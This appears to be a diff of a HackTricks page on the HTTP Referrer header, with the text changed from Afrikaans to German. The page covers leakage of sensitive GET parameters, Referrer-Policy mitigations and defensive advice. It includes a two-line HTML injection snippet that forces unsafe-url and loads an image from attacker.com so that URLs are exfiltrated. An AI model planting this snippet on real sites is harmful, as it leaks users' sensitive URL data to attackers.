@@ -1,30 +1,30 @@
 {% hint style="success" %}
-Leer en oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 
-# Verwysingskoppe en beleid
+# Referrer-Header und -Richtlinie
 
-Verwysing is die kop wat deur webblaaie gebruik word om aan te dui watter die vorige bladsy was wat besoek is.
+Referrer ist der Header, den Browser verwenden, um anzugeben, welche die vorherige besuchte Seite war.
 
-## Sensitiewe inligting wat uitgelek is
+## Sensible Informationen geleakt
 
-Indien op enige oomblik binne 'n webbladsy enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat 'n URL besoek wat deur die aanvaller beheer word. Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek uit te skakel.
+Wenn sich zu irgendeinem Zeitpunkt innerhalb einer Webseite sensible Informationen in den GET-Anforderungsparametern befinden, wenn die Seite Links zu externen Quellen enthält oder ein Angreifer in der Lage ist, den Benutzer dazu zu bringen, eine von ihm kontrollierte URL zu besuchen (Social Engineering). Es könnte möglich sein, die sensiblen Informationen in der letzten GET-Anforderung zu exfiltrieren.
 
-## Versagting
+## Minderung
 
-Jy kan die blaaier laat 'n **Verwysingsbeleid** volg wat die sensitiewe inligting kan **vermy** om na ander webtoepassings gestuur te word:
+Sie können den Browser dazu bringen, eine **Referrer-Policy** zu befolgen, die **verhindern** könnte, dass die sensiblen Informationen an andere Webanwendungen gesendet werden:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -35,13 +35,29 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Teenmaatreël
+## Gegenmaßnahmen
 
-Jy kan hierdie reël oorskryf deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting uitbuit):
+Sie können diese Regel mit einem HTML-Meta-Tag überschreiben (der Angreifer muss eine HTML-Injection ausnutzen):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
-## Verdediging
+## Verteidigung
 
-Moenie enige sensitiewe data binne GET parameters of paaie in die URL plaas nie.
+Setzen Sie niemals sensible Daten in GET-Parametern oder Pfaden in der URL ein.
+
+
+{% hint style="success" %}
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Unterstützen Sie HackTricks</summary>
+
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
+
+</details>
+{% endhint %}
